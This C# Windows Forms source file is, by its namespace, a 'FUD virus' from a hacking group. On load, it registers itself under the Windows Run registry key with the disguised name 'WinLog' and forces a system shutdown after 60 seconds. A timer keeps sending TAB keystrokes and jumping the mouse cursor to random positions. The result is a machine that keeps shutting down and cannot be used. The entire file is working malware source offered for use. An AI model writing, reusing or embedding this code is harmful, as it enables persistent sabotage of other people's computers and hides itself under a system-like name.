using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TurkHackTeamFUDVirus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            if (!File.Exists("adsasdwqeq2.a"))
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("WinLog", "" + Application.ExecutablePath + "");
                using (var wr = new StreamWriter("adsasdwqeq2.a"))
                    wr.Write(" ");
                System.Diagnostics.Process.Start("shutdown", "-s -t 60 -f");
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SendKeys.Send("{TAB}");
            Cursor.Position = new Point(new Random().Next(100, 300), new Random().Next(100, 300));
        }
    }
}